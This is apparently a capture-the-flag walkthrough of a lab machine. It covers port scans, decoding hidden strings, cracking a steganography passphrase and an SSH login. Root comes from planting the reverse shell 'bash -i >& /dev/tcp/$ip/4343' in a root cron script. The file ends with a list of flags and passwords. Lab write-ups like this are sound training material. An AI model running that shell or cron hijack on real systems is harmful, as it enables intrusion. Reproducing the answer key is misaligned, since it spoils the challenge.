@@ -1,0 +1,111 @@
+as always started with rustscan to scan all the ports
+
+got all these results
+
+PORT      STATE SERVICE REASON
+80/tcp    open  http    syn-ack
+6498/tcp  open  unknown syn-ack
+65524/tcp open  unknown syn-ack
+
+
+nmap scan
+
+Nmap scan report for 10.10.82.51
+Host is up, received conn-refused (0.22s latency).
+Scanned at 2021-06-25 01:43:44 IST for 19s
+
+PORT      STATE SERVICE REASON  VERSION
+80/tcp    open  http    syn-ack nginx 1.16.1
+| http-methods: 
+|_  Supported Methods: GET HEAD
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: nginx/1.16.1
+|_http-title: Welcome to nginx!
+6498/tcp  open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf5hzG6d/mEZZIeldje4ZWpwq0zAJWvFf1IzxJX1ZuOWIspHuL0X0z6qEfoTxI/o8tAFjVP/B03BT0WC3WQTm8V3Q63lGda0CBOly38hzNBk8p496scVI9WHWRaQTS4I82I8Cr+L6EjX5tMcAygRJ+QVuy2K5IqmhY3jULw/QH0fxN6Heew2EesHtJuXtf/33axQCWhxBckg1Re26UWKXdvKajYiljGCwEw25Y9qWZTGJ+2P67LVegf7FQu8ReXRrOTzHYL3PSnQJXiodPKb2ZvGAnaXYy8gm22HMspLeXF2riGSRYlGAO3KPDcDqF4hIeKwDWFbKaOwpHOX34qhJz
+|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN8/fLeNoGv6fwAVkd9oVJ7OIbn4117grXfoBdQ8vY2qpkuh30sTk7WjT+Kns4MNtTUQ7H/sZrJz+ALPG/YnDfE=
+|   256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNgw/EuawEJkhJk4i2pP4zHfUG6XfsPHh6+kQQz3G1D
+65524/tcp open  http    syn-ack Apache httpd 2.4.43 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.43 (Ubuntu)
+|_http-title: Apache2 Debian Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+so i started enumerating the machine and accidentaly find the flag 3 in the source code of por 65525! main page
+
+
+found a dir hidden in the port 80 started a new scan in the port80/hidden
+
+after finding the hidden directory i again started a gobuster scan in it and found a directory named /whatever
+
+after reading the source code of that file i found a base64 encoded sting which i decoded using cyberchef ZmxhZ3tmMXJzN19mbDRnfQ== : flag{f1rs7_fl4g}
+
+for the second flag i was just looking at the source code of 65525 and found something again in the source code it was something like this
+
+
+<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
+
+
+as it is written it is encoded with ba 
+
+so i opened cyberchef and started trying all type of decoders which starts with ba
+
+like base32,base64.base58 etc etc and base62 matched and i got the secrect directory
+
+/n0th1ng3ls3m4tt3r
+
+cracked the given string using md5hashing website and the flag was
+940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
+flag{1m_s3c0nd_fl4g}
+
+now here i saw a string and an image file i decided to downnlaod that image file as i was having no option
+
+i downlaoded the image and started steghide --extract -sf filename
+it asked for passphrase i tried the passphrase that was hidden on the image website but it didnt worked so tired the easypeasy.txt wordlist and got tthe password!
+
+i used stegcracker to crack the password
+after that i opened the file and there was user name and password was given
+i converted the binary password to text and tried to login into ssh using those creds and i was able to login!
+
+after that i tried sudo -l it didnt worked the after that i tried suid but no file was given suid perms
+
+checked the crontabs by
+cat /etc/crontabs and saw the root user is running a bash script after some inteval
+
+
+* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
+
+
+went to the /var/www and edited the mysecretcronjob.sh and added a rev shell into the file
+
+bash -i >& /dev/tcp/$ip/4343 0>&1
+
+
+
+
+after that i opened up a nc listener on the other terminal and waited for the connection got the root user ! cheers!
+
+
+
+
+3
+1.16.1
+apache
+flag{f1rs7_fl4g}
+flag{1m_s3c0nd_fl4g}
+flag{9fdafbd64c47471a8f54cd3fc64cd312}
+/n0th1ng3ls3m4tt3r
+mypasswordforthatjob
+iconvertedmypasswordtobinary
+flag{n0wits33msn0rm4l}
+flag{63a9f0ea7bb98050796b649e85481845}
